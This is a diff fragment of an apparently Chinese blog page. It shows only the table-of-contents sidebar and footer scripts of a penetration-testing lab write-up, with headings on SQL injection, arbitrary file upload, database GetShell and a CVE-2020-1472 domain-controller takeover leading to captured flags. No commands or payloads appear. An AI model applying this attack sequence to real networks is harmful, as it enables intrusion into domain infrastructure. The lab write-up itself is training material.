+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">靶场描述</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA%E6%8B%93%E6%89%91%E5%9B%BE"><span class="nav-number">1.1.</span> <span class="nav-text">靶场拓扑图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VSP%E8%AE%BE%E7%BD%AE"><span class="nav-number">1.2.</span> <span class="nav-text">VSP设置</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">2.</span> <span class="nav-text">WEB服务器</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.1.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="nav-number">2.1.2.</span> <span class="nav-text">目录遍历</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tomexam-Sql%E6%B3%A8%E5%85%A5"><span class="nav-number">2.3.</span> <span class="nav-text">Tomexam Sql注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#jspXCMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">3.</span> <span class="nav-text">jspXCMS任意文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Flag1"><span class="nav-number">3.1.</span> <span class="nav-text">Flag1</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">4.</span> <span class="nav-text">数据库服务器</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="nav-number">4.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93GetShell"><span class="nav-number">4.2.</span> <span class="nav-text">数据库GetShell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flag2"><span class="nav-number">4.3.</span> <span class="nav-text">Flag2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7"><span class="nav-number">5.</span> <span class="nav-text">域控</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2"><span class="nav-number">5.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2020-1472"><span class="nav-number">5.2.</span> <span class="nav-text">CVE-2020-1472</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E8%8E%B7%E5%8F%96DC%E4%B8%BB%E6%9C%BA%E5%90%8D"><span class="nav-number">5.2.1.</span> <span class="nav-text">1、获取DC主机名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E8%BF%9E%E6%8E%A5DC%E6%B8%85%E7%A9%BA%E5%87%AD%E6%8D%AE"><span class="nav-number">5.2.2.</span> <span class="nav-text">2、连接DC清空凭据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85Hash"><span class="nav-number">5.2.3.</span> <span class="nav-text">3、获取域内Hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4%E3%80%81%E9%80%9A%E8%BF%87Hash%E8%BF%9E%E6%8E%A5%E5%9F%9F%E6%8E%A7"><span class="nav-number">5.2.4.</span> <span class="nav-text">4、通过Hash连接域控</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5%E3%80%81%E6%81%A2%E5%A4%8D%E5%AF%86%E7%A0%81"><span class="nav-number">5.2.5.</span> <span class="nav-text">5、恢复密码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flag3"><span class="nav-number">5.3.</span> <span class="nav-text">Flag3</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
